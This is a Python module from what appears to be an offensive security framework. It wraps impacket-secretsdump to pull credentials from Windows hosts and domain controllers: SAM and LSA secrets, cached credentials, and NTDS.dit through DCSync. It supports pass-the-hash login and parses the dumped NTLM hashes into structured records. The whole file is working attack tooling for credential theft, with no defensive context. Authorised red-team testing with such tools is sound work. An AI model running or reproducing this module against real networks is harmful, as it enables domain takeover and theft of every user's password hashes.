#!/usr/bin/env python3
"""
credential_dump — Credential extraction via impacket-secretsdump.

CLI deps: impacket-secretsdump (installed on Kali)

Dumps SAM, LSA secrets, cached credentials, and NTDS.dit
(via DCSync) from domain controllers and workstations.
"""

import json
import re
import time

from base_module import TacticalModule


class CredentialDump(TacticalModule):
    name = "credential_dump"
    description = "Credential extraction via impacket-secretsdump"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--target", required=True,
            help="Target (DOMAIN/user:password@HOST or DOMAIN/user@HOST)",
        )
        self.parser.add_argument(
            "--hash",
            help="NTLM hash for auth (LM:NT format)",
        )
        self.parser.add_argument(
            "--just-dc", action="store_true",
            help="Extract only NTDS.dit data (DCSync)",
        )
        self.parser.add_argument(
            "--just-dc-ntlm", action="store_true",
            help="Extract only NTLM hashes from NTDS.dit",
        )
        self.parser.add_argument(
            "--sam", action="store_true",
            help="Dump SAM database",
        )
        self.parser.add_argument(
            "--output-file",
            help="Output file for dumped hashes",
        )

    def run(self, args) -> None:
        sd_args = [args.target]

        if args.hash:
            if not self.validate_hash(args.hash):
                self.output_error(f"Invalid NTLM hash format: {args.hash}")
                return
            sd_args.extend(["-hashes", args.hash])

        if args.just_dc:
            sd_args.append("-just-dc")
        elif args.just_dc_ntlm:
            sd_args.append("-just-dc-ntlm")

        if args.output_file:
            sd_args.extend(["-outputfile", args.output_file])

        start = time.monotonic()
        result = self.run_tool("impacket-secretsdump", sd_args, timeout=args.timeout)
        duration_ms = int((time.monotonic() - start) * 1000)

        credentials = self._parse_output(result.stdout)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            result.returncode, result.stdout[:5000], result.stderr[:5000], duration_ms,
        )
        self.output_success({
            "target": args.target,
            "credentials": credentials,
            "credential_count": len(credentials),
            "output_file": args.output_file,
            "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_output(output: str) -> list[dict]:
        """Parse secretsdump output for credentials."""
        creds: list[dict] = []
        section = ""

        for line in output.split("\n"):
            line = line.strip()
            if "[*] Dumping" in line:
                if "SAM" in line:
                    section = "SAM"
                elif "LSA" in line:
                    section = "LSA"
                elif "NTDS" in line:
                    section = "NTDS"
                elif "Domain Credentials" in line:
                    section = "cached"
                continue

            # SAM/NTDS format: user:RID:LM:NT:::
            ntlm_match = re.match(
                r"^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
                line,
            )
            if ntlm_match:
                creds.append({
                    "source": section,
                    "username": ntlm_match.group(1),
                    "rid": int(ntlm_match.group(2)),
                    "lm_hash": ntlm_match.group(3),
                    "nt_hash": ntlm_match.group(4),
                })
                continue

            # Cached credentials: domain/user:hash
            cached_match = re.match(r"^([^:]+):([a-fA-F0-9]+)$", line)
            if cached_match and section == "cached":
                creds.append({
                    "source": "cached",
                    "username": cached_match.group(1),
                    "hash": cached_match.group(2),
                })

        return creds


if __name__ == "__main__":
    CredentialDump().execute()
